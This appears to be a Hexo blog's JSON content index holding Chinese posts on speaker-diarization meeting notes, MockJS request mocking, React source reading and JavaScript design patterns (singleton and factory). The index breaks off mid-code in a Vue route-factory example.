{"meta":{"title":"Ender","subtitle":"Coding Never Stop","description":"a blog of EnderXiao","author":"John Doe","url":"http://enderxiao.github.io","root":"/"},"pages":[{"title":"","date":"2024-07-30T11:26:33.900Z","updated":"2024-07-30T11:26:33.900Z","comments":true,"path":"404.html","permalink":"http://enderxiao.github.io/404.html","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除，或者不小心进入了异次元"},{"title":"","date":"2024-07-30T11:26:33.941Z","updated":"2024-07-30T11:26:33.941Z","comments":true,"path":"about/index.html","permalink":"http://enderxiao.github.io/about/index.html","excerpt":"","text":"This,is,me! 2019年12月15日 参与衡师小助手微信小程序前端开发 2019年8月30日 参加湖南省15届大学生计算机程序设计竞赛 2019年8月30日 参加湖南省15届大学生计算机程序设计竞赛 2018年9月2日 参加湖南省14届大学生计算机程序设计竞赛 2017年12月11日 通过ACM新生选拔赛，正式称为校ACM实验室训练队员 2017年10月14日 参与衡阳师范学院ACM实验室选拔训练 2017年9月1日 入学衡阳师范学院计算机学院软件工程专业 2017年7月 从衡阳市第一中学毕业 2014年4月 与你相遇"},{"title":"Categories","date":"2024-07-30T11:26:33.941Z","updated":"2024-07-30T11:26:33.941Z","comments":true,"path":"categories/index.html","permalink":"http://enderxiao.github.io/categories/index.html","excerpt":"","text":""},{"title":"Friends","date":"2024-07-30T11:26:33.942Z","updated":"2024-07-30T11:26:33.942Z","comments":true,"path":"friends/index.html","permalink":"http://enderxiao.github.io/friends/index.html","excerpt":"","text":""},{"title":"Tags","date":"2024-07-30T11:26:35.231Z","updated":"2024-07-30T11:26:35.231Z","comments":true,"path":"tags/index.html","permalink":"http://enderxiao.github.io/tags/index.html","excerpt":"","text":""},{"title":"","date":"2024-07-30T11:26:35.231Z","updated":"2024-07-30T11:26:35.231Z","comments":true,"path":"mylist/index.html","permalink":"http://enderxiao.github.io/mylist/index.html","excerpt":"","text":""},{"title":"","date":"2024-07-30T11:26:33.942Z","updated":"2024-07-30T11:26:33.942Z","comments":true,"path":"custom/MathScroll/style.css","permalink":"http://enderxiao.github.io/custom/MathScroll/style.css","excerpt":"","text":".katex-block{ overflow-x: auto; overflow-y: auto; }"},{"title":"","date":"2024-07-30T11:26:33.942Z","updated":"2024-07-30T11:26:33.942Z","comments":true,"path":"custom/drakmode/darkmode.css","permalink":"http://enderxiao.github.io/custom/drakmode/darkmode.css","excerpt":"","text":"#RightDownBtn { position: fixed; left: 1.875rem; bottom: 1.875rem; padding: 0.3125rem 0.625rem; background: #fff; border-radius: 0.1875rem; transition: 0.3s ease all; z-index: 1; align-items: flex-end; flex-direction: column; display: -moz-flex; display: flex; float: right; } #RightDownBtn>a, #RightDownBtn>label { width: 1.5em; height: 1.5em; margin: 0.3125rem 0; transition: .2s cubic-bezier(.25, .46, .45, .94); } /* font color */ .DarkMode #page, .DarkMode #colophon, .DarkMode #vcomments .vbtn, .DarkMode .art-content #archives .al_mon_list .al_mon, .DarkMode .art-content #archives .al_mon_list span, .DarkMode body, .DarkMode .art-content #archives .al_mon_list .al_mon, .DarkMode .art-content #archives .al_mon_list span, .DarkMode button, .DarkMode .art .art-content #archives a, .DarkMode textarea, .DarkMode strong, .DarkMode a, .DarkMode p, .DarkMode li, .DarkMode .label { color: rgba(255, 255, 255, .6); } .DarkMode #page, .DarkMode body, .DarkMode #colophon, .DarkMode #main-container, .DarkMode #page .yya, .DarkMode #content, .DarkMode #contentss, .DarkMode #footer { background-color: #292a2d; } .DarkMode strong, .DarkMode img { filter: brightness(.7); } /* sun and noon */ .Cuteen_DarkSky, .Cuteen_DarkSky:before { content: \"\"; position: fixed; left: 0; right: 0; top: 0; bottom: 0; z-index: 88888888 } .Cuteen_DarkSky { background: linear-gradient(#feb8b0, #fef9db) } .Cuteen_DarkSky:before { transition: 2s ease all; opacity: 0; background: linear-gradient(#4c3f6d, #6c62bb, #93b1ed) } .DarkMode .Cuteen_DarkSky:before { opacity: 1 } .Cuteen_DarkPlanet { z-index: 99999999; position: fixed; left: -50%; top: -50%; width: 200%; height: 200%; -webkit-animation: CuteenPlanetMove 2s cubic-bezier(.7, 0, 0, 1); animation: CuteenPlanetMove 2s cubic-bezier(.7, 0, 0, 1); transform-origin: center bottom } @-webkit-keyframes CuteenPlanetMove { 0% { transform: rotate(0) } to { transform: rotate(360deg) } } @keyframes CuteenPlanetMove { 0% { transform: rotate(0) } to { transform: rotate(360deg) } } .Cuteen_DarkPlanet:after { position: absolute; left: 35%; top: 40%; width: 9.375rem; height: 9.375rem; border-radius: 50%; content: \"\"; background: linear-gradient(#fefefe, #fffbe8) }"},{"title":"","date":"2024-07-30T11:26:33.942Z","updated":"2024-07-30T11:26:33.942Z","comments":true,"path":"custom/drakmode/darkmode.js","permalink":"http://enderxiao.github.io/custom/drakmode/darkmode.js","excerpt":"","text":"function BackTOP() { $(\"#btn\").hide(); $(function () { $(window).scroll(function () { if ($(window).scrollTop() > 50) { $(\"#btn\").fadeIn(200); } else { $(\"#btn\").fadeOut(200); } }); $(\"#btn\").click(function () { $('body,html').animate({ scrollTop: 0 }, 500); return false; }); }); $(function () { $(\"#say\").click(function () { $('body,html').animate({ scrollTop: $('html, body').get(0).scrollHeight }, 500); return false; }); }) } $('#readmode').click(function () { $('body').toggleClass('read-mode') }) function SiderMenu() { $('#main-container').toggleClass('open'); $('.iconflat').css('width', '50px').css('height', '50px'); $('.openNav').css('height', '50px'); $('#main-container,#mo-nav,.openNav').toggleClass('open') } function switchNightMode() { $('').appendTo($(\"body\")), setTimeout( function () { (volantis.dark.mode == \"dark\") ? ($(\"html\").addClass(\"DarkMode\"), $('#modeicon').attr(\"xlink:href\", \"#icon-sun\")) : ($(\"html\").removeClass(\"DarkMode\"), $('#modeicon').attr(\"xlink:href\", \"#icon-_moon\")), setTimeout(function () { $(\".Cuteen_DarkSky\").fadeOut(1e3, function () { $(this).remove() }) }, 2e3) }), 50 } function checkNightMode() { if ($(\"html\").hasClass(\"n-f\")) { $(\"html\").removeClass(\"day\"); $(\"html\").addClass(\"DarkMode\"); $('#modeicon').attr(\"xlink:href\", \"#icon-sun\") return; } if ($(\"html\").hasClass(\"d-f\")) { $(\"html\").removeClass(\"DarkMode\"); $(\"html\").addClass(\"day\"); $('#modeicon').attr(\"xlink:href\", \"#icon-_moon\") return; } if (volantis.dark.mode == \"dark\") { $(\"html\").addClass(\"DarkMode\"); $('#modeicon').attr(\"xlink:href\", \"#icon-sun\") } else { $(\"html\").removeClass(\"DarkMode\"); $('#modeicon').attr(\"xlink:href\", \"#icon-_moon\") } } BackTOP(); volantis.dark.push(switchNightMode);"}],"posts":[{"title":"","slug":"组会记录","date":"2024-07-30T11:26:33.938Z","updated":"2024-07-30T11:26:33.938Z","comments":true,"path":"2024/07/30/组会记录/","permalink":"http://enderxiao.github.io/2024/07/30/%E7%BB%84%E4%BC%9A%E8%AE%B0%E5%BD%95/","excerpt":"","text":"组会记录 马师兄 该模型用与为音频进行标注，标注每个时间段几个人在说话 训练集 原始音频双人对话 Musan-speech加噪声 本课题主要专注于人声分离，因此将1中的对话与2中叠加形成噪声 F-bank滤波 预加重 使用高通滤波器，缩小低频，以弥补人声在高频上的损失 实际处理时使用语谱图进行处理，对原本的时间-振幅图进行短时傅里叶变换，得到频域上的语谱图。 分帧加窗口 窗口，一般将200帧定义为一个窗口，因为经验证明200帧以内的发音基本不变的同时保证一个窗口内的信息不至于过少。 步长，一般选择窗口的50%作为步长，因为这样可以保证能够保留相邻窗口之间信息的相互关系 加窗，这里使用汉明窗，即中间为1，两头为0，目的时为了避免边角信息的影响。 短时傅里叶变换 mel滤波器 该滤波器用于模拟人耳的收听习惯，对低频更敏感，该滤波器主要保留了低频信息，主要是为了降低数据量 取对数 将滤波后的数据取对数，使数据归一化，降低计算复杂度 Transformer-encoder 原模型使用了两个encoder，和4个头。本模型为原模型增加了两个encoder，改用8个头 前两次encoder 用于说话人特征提取 改进后模型的错误率降低了9，75% 当增加到8层encoder时，错误率反而上升了，初步认为是数据不够支撑不起庞大的模型 原文中部分数据集获取不到 接下来会议对数据集的来源问题进行了讨论，部分数据集的来源无法写到论文中，当数据集获取困难时，偶尔需要自己制造数据，例如本实验中使用的对话数据集，可以对不同的单人语音进行合成从而得到对话数据。","categories":[],"tags":[]},{"title":"Mock学习","slug":"Mock学习","date":"2024-07-28T04:29:11.000Z","updated":"2024-07-30T11:26:33.911Z","comments":true,"path":"2024/07/28/Mock学习/","permalink":"http://enderxiao.github.io/2024/07/28/Mock%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Mock随机数据生成，Ajax请求拦截 MockJS简介 MockJS是一款适用于前后端分离的，主要负责进行axios请求拦截与随机数据生成的JS库 MockJS定义了丰富的数据类型生成，详见MockJS Mock安装 1npm i mockjs -D 安装在生产环境 Mock与React的结合 通常在src目录下创建一个mock文件夹对负责生成数据的文件进行统一管理，上传代码时忽略mock文件夹 首先创建一个index.js作为入口文件 1234567891011121314151617// mock/index.js// 引入Mockimport Mock from &quot;mockjs&quot;;// 引入具体需要拦截的请求import blogListMock from &quot;./blogData.js&quot;;// 统一展开保存到一个数组中const mocks = [...blogListMock];// 对于每一个接口，调用Mock.mock函数进行注册for (const i of mocks) &#123; // 接收三个参数：需要拦截的URL, 需要拦截的请求类型, 请求的响应体(支持对象和函数) Mock.mock(i.url, i.type, i.response);&#125; 随后我们可以再根据业务，分别创建这些业务的接口文件，并定义需要生成的数据形状 例如我们现在有如下需求： 请求接口得到所有博客数据数组 每条博客数据包含： id 作者author name avatar 内容content 发布时间date 与博客相关的业务暂时只有这一个接口，那么我们可以创建一个博客相关接口的文件blogData.js，然后开始编写： 1234567891011121314151617181920212223242526272829303132333435363738394041import Mock from &quot;mockjs&quot;;const Random = Mock.Random;const blogListMock = [ &#123; // 拦截的请求url url: &quot;/api/getBlogList&quot;, // 请求方法 type: &quot;get&quot;, // 响应函数，可以接受参数，此处支持函数和对象 response: (config) =&gt; &#123; console.log(&quot;BlogData Mock config: &quot;, config); return Mock.mock(&#123; message: &quot;success&quot;, code: 200, // 名为data的包含10个元素的数组 &quot;data|10&quot;: [ &#123; // 名为id的属性，每次自增1 &quot;id|+1&quot;: 1, author: &#123; // 随机英文名 name: Random.name(), // 随机图片头像 avatar: Random.image(), &#125;, // 随机段落内容，长度为15-20个单词 content: Random.paragraph(15, 20), // 随机时间，格式为年-月-日 publishDate: Random.date(&quot;yyyy-MM-dd&quot;), &#125;, ], &#125;); &#125;, &#125;,];// 暴露给index.jsexport default blogListMock; 随后在具体的逻辑页面中，我们就可以直接是用axios请求设定好的URL，以此来获得生成好的数据： 12345axios.get(&quot;/api/getBlogList&quot;).then((res) =&gt; &#123; setBlogList(res.data.data);&#125;).catch((error) =&gt; &#123; console.log(error);&#125;); 如果是是用Vite进行构建，还可以设置开发环境变量： 123// .env.developmentNODE_ENV = developmentREACT_APP_MOCK = true","categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Mock","slug":"前端/Mock","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/Mock/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/tags/%E5%89%8D%E7%AB%AF/"},{"name":"Mock","slug":"Mock","permalink":"http://enderxiao.github.io/tags/Mock/"},{"name":"React","slug":"React","permalink":"http://enderxiao.github.io/tags/React/"}]},{"title":"React源码阅读","slug":"React源码阅读","date":"2024-06-21T06:42:51.000Z","updated":"2024-07-30T11:26:33.913Z","comments":true,"path":"2024/06/21/React源码阅读/","permalink":"http://enderxiao.github.io/2024/06/21/React%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/","excerpt":"React进阶学习","text":"React进阶学习 源码阅读流程 下载源码 观察package.json： 主要使用的依赖 构建相关的脚本 根据核心API找寻结构： packages/react packages/react-dom packages/react-reconciler packages/scheduler 串联整个流程： 项目初始化 ReactDOM.render createRoot 数据更新流程 this.setState const[_,update] = useState() forupdate 基本API的使用方式 hooks useState useReducer useId React源码下载 1git clone https://github.com/facebook/react.git monorepo与架构 monorepo是一种项目管理方式。指在单个仓库中管理多个项目 monorepo演进阶段一，单仓库巨石应用：Monolith 一个Git仓库维护项目所有代码，项目代码随业务复杂度增加而增多，成为单体巨石应用。 阶段二，多仓库多模块应用：Multirepo 项目被拆分为多个业务模块，对应多个Git仓库，模块解耦，降低应用复杂度，每个模块可以独立测试开发。模块仓库随业务复杂度增加二增多，难以进行项目管理，跨仓库共享难，模块依赖管理复杂，增加了项目构建耗时 阶段三，单仓库多模块应用：Monorepo 将多个项目集成到一个仓库下，共享工程配置，同时快捷地共享模块代码。 主流monorepo方案 lerna pnpm workspace turborepo JSX 一段JSX代码： 1234const name = &#x27;Jack&#x27;const dv = ( &lt;div&gt;你好，我叫：&#123;name&#125; &lt;/div&gt;) 如果想要编译为一段可用的js代码，需要经过babel编译，而babel又需要借助插件@babel/plugin-transform-react-jsx才能便利jsx。 通过React学习我们知道所有JSX语法最终会被编译为React.createElement方法的调用 上述代码经过编译后会变为： 12const name = &#x27;jack&#x27;const dv = React.createElement(&quot;div&quot;, null, name) React核心API 从ReactClient.js文件入手，可以看到React暴露给开发者的核心API useState useReducer useCallback useMemo userRef createContext，Provider createElement","categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"工作","slug":"工作","permalink":"http://enderxiao.github.io/categories/%E5%B7%A5%E4%BD%9C/"},{"name":"React","slug":"工作/React","permalink":"http://enderxiao.github.io/categories/%E5%B7%A5%E4%BD%9C/React/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"React","slug":"React","permalink":"http://enderxiao.github.io/tags/React/"},{"name":"前端框架","slug":"前端框架","permalink":"http://enderxiao.github.io/tags/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6/"}]},{"title":"JS设计模式","slug":"JS设计模式","date":"2024-04-11T06:11:11.000Z","updated":"2024-07-30T11:26:33.909Z","comments":true,"path":"2024/04/11/JS设计模式/","permalink":"http://enderxiao.github.io/2024/04/11/JS%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/","excerpt":"设计模式收集使用JS实现，参考JS设计模式Github仓库以及书《JavaScript设计模式与开发实践》曾探著","text":"设计模式收集使用JS实现，参考JS设计模式Github仓库以及书《JavaScript设计模式与开发实践》曾探著 设计模式 设计模式通常是前任在开发中总结而来的经验，通常我们在看别人代码的时候，会产生：“为什么这么写”的疑问。而学习设计模式的目的在于帮助我们更好地理解代码。 本文沿用GoF四人组(Erich Gamma、Richard Helm、Ralph Johnson、John Vlissides)的分类方式将设计模式分为： 创建型模式 创建对象 结构型模式 处理类或对象的组合 行为型模式 描述类或对象怎样交互和怎样分配职责 三类并使用JS进行实现 设计模式六大原则 在描述设计模式之前，先来聊聊设计原则吧，因为稍后介绍的设计模式都或多或少的应用了这些设计原则，而且这些原则能够帮助我们提高自己代码的健壮性。 本章参考知乎——六大设计模式 六大设计原则包括： 单一责任原则(Single Responsibility Principle) 定义：应该有，且仅有一个原因引起类的变更 理解：即一个接口或类或方法，应该具有单一职责，例如一个接口要么进行协议管理要么进行数据传输，不应同时具备上述两种职责。 优点： 类复杂性低 可读性，可维护性高 变更分析低 总结：一个类或接口只承担一个职责。 开闭原则(Open Closed Principle) 定义：一个软件实体（类，模块，函数）对扩展开放，对修改封闭 理解：开闭原则是其他五大原则的精神领袖，其他五大原则都是实现开闭原则的具体型态 优点： 提高可复用性与可维护性 总结：对软件实体的改动，最好用扩展而非修改的方式。 里氏替换原则(Liskov Substitution Principle)（LSP❌） 定义：如果对每一个类型为S的对象o1，都有类型为T的对象o2，使得以T定义的所有程序P中，使用对象o2替换所有的对象o1时，程序P的行为没有发生变化，那么类型S是类型T的子类型。 理解：就是只要父类能出现的地方，子类就可以出现，而且替换为子类也不会产生任何错误或异常。符合该原则的继承可以被定义为良好的继承 子类必须完全实现父类的方法 子类可以有自己的个性 覆盖或实现父类的方法时，输入参数可以被放大，即子类重载父类方法时，参数范围要≥\\geq≥父类方法参数 覆盖或实现父类的方法时，输出结果可以被缩小，即子类重载父类方法时，返回值范围要≤\\leq≤父类方法返回值 总结：在继承类时，务必重写（override）父类中所有的方法，尤其需要注意父类的protected方法（它们往往是让你重写的），子类尽量不要暴露自己的public方法供外界调用。 迪米特法则(Law of Demeter)(也叫最少知道原则) 定义：一个对象应该对其他对象有最少的了解 理解： 只和直接的朋友交流：出现在成员变量、方法的输入输出参数中的类称为成员朋友类，一个类的方法中只能和朋友类进行数据交流，不能涉及其他类 朋友间也是有距离的：开发中尽量不要对外公布太多public方法和非静态的public变量，尽量内敛，可以整合为一个方法的需要进行整合。 是自己的就是自己的：如果一个方法放在本类中，既不增加类间关系，也对本类不产生负面影响，那就放置在本类中。 总结：尽量减少对象之间的交互，从而减小类之间的耦合。 接口隔离原则(Interface Segregation Principle) 定义：户端不应该依赖它不需要的接口，或者说类间的依赖关系应该建立在最小的接口上。 理解：把一个臃肿的接口拆分为多个独立的接口 总结：不要对外暴露没有实际意义的接口。 依赖倒置原则(Dependence Inversion Principle) 定义：即面向接口编程 模块间的依赖通过抽象发生，实现类之间不直接发生依赖关系，其依赖关系是通过接口或抽象类产生的 接口或抽象类不依赖于实现类 实现类依赖接口或抽象类 理解： 每个类尽量都有接口或抽象类，或者接口和抽象类两者都具备。 变量的字面类型尽量是接口或抽象类。 任何类都不应该从具体类派生。 尽量不要重写基类的方法。如果基类是一个抽象类，而且这个方法已经实现了，子类尽量不要重写。 优点： 减少类间的耦合性，提高系统的稳定性 降低并行开发引起的风险 提高代码的可读性和可维护性。 总结：高层模块不应该依赖于低层模块，而应该依赖于抽象。抽象不应依赖于细节，细节应依赖于抽象。 我们把这六大原则的首字母放进一个Set中，并保持原有顺序，就能得到字符串SOLID，预示着六大原则结合后的好处：健壮、稳定 创建型模式 创建型模式 (Creational Pattern) 对类的实例化过程进 行了抽象，能够 将软件模块中对象的创建和对象的使用 分离 。为了使软件的结构更加清晰，外界对于这些对象 只需要知道它们共同的接口，而不清楚其具体的实现细 节，使整个系统的设计更加符合单一职责原则。 创建型模式在 创建什么 (What) ， 由谁创建 (Who) ， 何 时创建 (When) 等方面都为软件设计者提供了尽可能大 的灵活性。创建型模式 隐藏了类的实例的创建细节，通 过隐藏对象如何被创建和组合在一起达到使整个系统独 立的目的 。 单例模式（Singleton Pattern） 在面向对象设计的语言中，单例模式通常为我们提供了一种避免多次进行实例化的方法，从而降低构造带来的性能消耗，在基于ES6的语法中，我们也可以实现这一功能。 另外单例模式分为： 懒汉式 使用时才进行实例化 饿汉式 先初始化，用的时候直接返回 由于js不需要考虑线程安全，所以推荐使用懒汉式写法，饿汉在JS中反而容易产生没必要的垃圾。 123456789101112131415161718192021222324252627282930313233class SingleObject &#123; constructor () &#123; // TODO: 防止使用new创建对象 if(new.target !== undefined) &#123; const errorMsg = &quot;This is single object,Can&#x27;t use keyword new!&quot;; const tipMsg = &quot;You should use method getInstance to get instance。&quot;; throw new Error(`\\n$&#123;errorMsg&#125;\\n$&#123;tipMsg&#125;`) &#125; &#125; // TODO: getInstance获取单例 static getInstance() &#123; // TODO: 如果存在单例直接返回 if(SingleObject.instance) &#123; return SingleObject.instance &#125; // TODO: 否则创建 SingleObject.instance = &#123;&#125; SingleObject.instance.__proto__ = SingleObject.prototype return SingleObject.instance &#125; // TODO: 实际功能 doSomething() &#123; console.log(&quot;..doing&quot;) &#125;&#125;const instance1 = SingleObject.getInstance();const instance2 = SingleObject.getInstance();instance1.doSomething() // ...doingconsole.log(instance1 === instance2) // true 但上述方法仍然存在一些不足，比如不满足1.单一责任原则，上述代码中进行单例是否存在判断的代码与实例化的代码是融合在一起的。另外上述代码也没能很好的满足2.开闭原则，因为如果在后续的场景中，我们需要创建多个对象时，就需要修改关于new方式的控制。 因此我们可以通过代理的方式将实现单例的代码抽离出来，他需要实现一下几个功能： 单例判断 支持接收任何对象，并返回对象单例 123456789101112131415161718192021222324252627282930function getSingle(classFun) &#123; let result; return () =&gt; &#123; return result || (result = new classFun()) &#125;&#125;class Object &#123; constructor() &#123;&#125; doSomething() &#123; console.log(&quot;...doing&quot;) &#125; // 支持函数式调用 __call__()&#123; return new Object() &#125;&#125;const singleObjectProxy = getSingle(Object)const instance1 = singleObjectProxy()const instance2 = singleObjectProxy()const instance3 = new Object()console.log(instance1 === instance2) // trueconsole.log(instance1 === instance3) // falseinstance1.doSomething() // ...doinginstance3.doSomething() // ...doing 单例设计模式远不止能够在面向对象中使用，利用单例模式，创建某些唯一的div浮窗来实现登陆框，iframe，script标签解决跨域问题时候，我们希望整个项目，或者某个页面中仅使用一个实例来减少创建实例的开销以优化性能。 并且懒汉式的单例模式能够避免页面在第一次加载的时候就将该元素加载。等到真正要用到这个元素时才创建该元素并加载DOM 123456789101112131415161718192021let getSingle = function(fn) &#123; let result; return (...args) =&gt; &#123; return result || (result = fn.apply(this, args)) &#125;&#125;let createLoginLayer = () =&gt; &#123; let dir = document.createElement(&#x27;div&#x27;) div.innerHtml = &#x27;Login Window&#x27; div.style.display = &#x27;none&#x27; document.body.appendChild(div) return div&#125;let createSingleLoginLayer = getSingle(createLoginLayer)document.getElementById(&#x27;LoginBtn&#x27;).onclick = function() &#123; let loginLayer = createSingleLoginLayer() loginLayer.style.display = &#x27;block&#x27;&#125; 工厂设计模式 工厂设计模式常用来实例化对象，某些对象的实例化逻辑非常复杂，我们希望将其封装到一个函数中，当我们想要实例化时，调用函数即可，那么这个用来封装的函数就可以被视为一个工厂，工厂设计模式按照抽象程度不同可以分为： 简单工厂模式 工厂模式 抽象工厂模式 简单工厂模式 简单工厂又叫静态工厂，核心思想是将某一种产品类的实例化交给工厂对象处理，主要用来创建同一类对象，这些类通常具体相同的父类，例如在进行用户鉴权时，可以根据用户类型渲染不同的页面： 12345678910111213141516171819202122232425262728class User &#123; // 构造函数 constructor(opt) &#123; this.name = opt.name this.viewPages = opt.viewPages &#125; // 静态方法实现工厂 static userFactory(role) &#123; switch (role) &#123; case &#x27;superAdmin&#x27;: return new User(&#123;name:&quot;超管&quot;, viewPages: [&#x27;首页&#x27;,&#x27;作业编辑&#x27;,&#x27;账号管理&#x27;, &#x27;阅卷&#x27;]&#125;) break; case &#x27;teacher&#x27;: return new User(&#123;name:&quot;教师&quot;, viewPages: [&#x27;首页&#x27;,&#x27;作业编辑&#x27;, &#x27;阅卷&#x27;]&#125;) break; case &#x27;student&#x27;: return new User(&#123;name:&quot;学生&quot;, viewPages: [&#x27;首页&#x27;&#125;) break; default: throw new Error(&quot;参数错误&quot;) &#125; &#125;&#125;const superAdmin = User.userFactory(&#x27;superAdmin&#x27;)const teacher = User.userFactory(&#x27;teacher&#x27;)const student = User.userFactory(&#x27;student&#x27;) 简单工厂的优势在于我们只需要传递正确的参数即可得到想要的实例化对象，无需关注实例化的过程。当函数包含了所有对象创建的逻辑，随着项目的增大，构造函数的增多，我们不仅需要修改方法工厂中的逻辑代码，该函数还会变成一个体量庞大的超级函数，因此只适用于实例化对象较少的场景。 工厂模式 工厂方法实际上是对静态工厂的进一步抽象，在简单工厂模式中，如果我们希望工厂生产型的同类产品，比如admin类别的用户，那么我们需要修改工厂中的代码，这违反了开闭原则，因此工厂模式使用抽象工厂类或接口来定义工厂需要具备的方法，然后为每个产品类构造对应的工厂，实现一个工厂对应一个产品的形式。 事实上这一设计利用了单一责任原则，将类的实例化充工厂中抽离，交由子类实现 这我们只需要添加一个新的createAdmin工厂函数即可，而不需要修改代码 12345678910111213141516171819202122232425262728293031class User &#123; constructor(name = &#x27;&#x27;, viewPages = []) &#123; if (new.target === User) &#123; throw Error(&quot;抽象类无法实例化&quot;) &#125; this.name = name this.viewPages = viewPages &#125;&#125;class UserFactory extends User &#123; constructor(name, viewPages) &#123; super(name, viewPages) &#125; createSuperAdmin() &#123; return new UserFactory(&#123;name:&quot;超管&quot;, viewPages: [&#x27;首页&#x27;,&#x27;作业编辑&#x27;,&#x27;账号管理&#x27;, &#x27;阅卷&#x27;]&#125;) &#125; createTeacher() &#123; return new UserFactory(&#123;name:&quot;教师&quot;, viewPages: [&#x27;首页&#x27;,&#x27;作业编辑&#x27;, &#x27;阅卷&#x27;]&#125;) &#125; createStudent() &#123; return new UserFactory(&#123;name:&quot;学生&quot;, viewPages: [&#x27;首页&#x27;]&#125;) &#125;&#125;const userFactory = new UserFactory();const superAdmin = userFactory.createSuperAdmin()const teacher = userFactory.createTeacher()const student = userFactory.createStudent() 抽象工厂模式 抽象工厂模式这是对工厂模式的进一步抽象，考虑如果我们想要生产除了User类以外的其他类，我们仍然需要修改工厂中的create方法，仍然会破坏开闭原则，因此我们需要更高级的抽象，需要一个抽象工厂，来管理其余的所有工厂： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970class User &#123; constructor(name = &#x27;&#x27;, viewPages = []) &#123; if (new.target === User) &#123; throw Error(&quot;抽象类无法实例化&quot;) &#125; this.name = name this.viewPages = viewPages &#125;&#125;class Problem &#123; constructor(title = &#x27;&#x27;, desc = &#x27;&#x27;, score = 0) &#123; if(new.target === Problem) &#123; throw Error(&quot;抽象类无法实例化&quot;) &#125; this.title = title this.desc = desc this.score = score &#125;&#125;class ProblemFactory extends Problem &#123; constructor(title, desc, score) &#123; super(title, desc, score) &#125; createEasyProblem() &#123; return new ProblemFactory(&quot;简单题&quot;, &quot;简单&quot;, &quot;1&quot;) &#125; createHardProblem() &#123; return new ProblemFactory(&quot;困难题&quot;, &quot;困难&quot;, &quot;5&quot;) &#125;&#125;class UserFactory extends User &#123; constructor(name, viewPages) &#123; super(name, viewPages) &#125; createSuperAdmin() &#123; return new UserFactory(&#123;name:&quot;超管&quot;, viewPages: [&#x27;首页&#x27;,&#x27;作业编辑&#x27;,&#x27;账号管理&#x27;, &#x27;阅卷&#x27;]&#125;) &#125; createTeacher() &#123; return new UserFactory(&#123;name:&quot;教师&quot;, viewPages: [&#x27;首页&#x27;,&#x27;作业编辑&#x27;, &#x27;阅卷&#x27;]&#125;) &#125; createStudent() &#123; return new UserFactory(&#123;name:&quot;学生&quot;, viewPages: [&#x27;首页&#x27;]&#125;) &#125;&#125;class EduFactory &#123; static getUserFactory() &#123; return new UserFactory() &#125; static getProblemFactory() &#123; return new ProblemFactory() &#125;&#125;const userFactory = EduFactory.getUserFactory()const teacher = userFactory.createTeacher()const student = userFactory.createStudent()const problemFactory = EduFactory.getProblemFactory()const easyProblem = problemFactory.createEasyProblem()const hardProblem = problemFactory.createHardProblem() 这样一来，日后如果需要生产新的商品，只需要添加型的工厂即可，不需要修改工厂中的代码 实际引用 最直接的应用就是在处理路由上了，假设现在我们有多个页面，需要让不同的用户根据路径进入不同的页面，通常我们会在route/index.js中直接进行配置： 点击查看代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// index.jsimport Vue from &#x27;vue&#x27;import Router from &#x27;vue-router&#x27;import Login from &#x27;../components/Login.vue&#x27;import SuperAdmin from &#x27;../components/SuperAdmin.vue&#x27;import Teacher from &#x27;../components/Teacher.vue&#x27;import Student from &#x27;../components/Student.vue&#x27;import NotFound404 from &#x27;../components/404.vue&#x27;Vue.use(Router)export default new Router(&#123; routes: [ //重定向到登录页 &#123; path: &#x27;/&#x27;, redirect: &#x27;/login&#x27; &#125;, //登陆页 &#123; path: &#x27;/login&#x27;, name: &#x27;Login&#x27;, component: Login &#125;, //超管页面 &#123; path: &#x27;/super-admin&#x27;, name: &#x27;SuperAdmin&#x27;, component: SuperAdmin &#125;, //教师页面 &#123; path: &#x27;/teacher&#x27;, name: &#x27;Teacher&#x27;, component: Teacher &#125;, //学生页面 &#123; path: &#x27;/student&#x27;, name: &#x27;Student&#x27;, component: Student &#125;, //404页面 &#123; path: &#x27;*&#x27;, name: &#x27;NotFound404&#x27;, component: NotFound404 &#125; ]&#125;) 此时，如果学生用户知道了教师用户的path，可以直接通过url进入教师页面，这样显然是不科学的，因此我们需要在登录的时候根据权限使用vue-router的addRoutes方法动态赋予权限，此处就可以利用工厂设计模式进行设计。 首先我们只需要在index.js中添加Login的路由： 点击查看代码 123456789101112131415161718192021import Vue from &#x27;vue&#x27;import Router from &#x27;vue-router&#x27;import Login from &#x27;../components/Login.vue&#x27;Vue.use(Router)export default new Router(&#123; routes: [ //重定向到登录页 &#123; path: &#x27;/&#x27;, redirect: &#x27;/login&#x27; &#125;, //登陆页 &#123; path: &#x27;/login&#x27;, name: &#x27;Login&#x27;, component: Login &#125;, ]&#125;) 随后我们在router目录下创建一个路由工厂routerFactory.js来根据登录状态动态地添加路由，我们可以利用数组的slice方法，将不属于该类用户的路由剔除，仅保留运行访问的路由： 点击查看代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263// routerFactory.jsimport SuperAdmin from &#x27;../components/SuperAdmin.vue&#x27;import Teacher from &#x27;../components/Teacher.vue&#x27;import Student from &#x27;../components/Student.vue&#x27;import NotFound404 from &#x27;../components/404.vue&#x27;let AllRouter = [ &#123; //超管页面 &#123; path: &#x27;/super-admin&#x27;, name: &#x27;SuperAdmin&#x27;, component: SuperAdmin &#125;, //教师页面 &#123; path: &#x27;/teacher&#x27;, name: &#x27;Teacher&#x27;, component: Teacher &#125;, //学生页面 &#123; path: &#x27;/student&#x27;, name: &#x27;Student&#x27;, component: Student &#125;, //404页面 &#123; path: &#x27;*&#x27;, name: &#x27;NotFound404&#x27;, component: NotFound404 &#125; &#125;]let routerFactory = (role) =&gt; &#123; switch(role) &#123; case 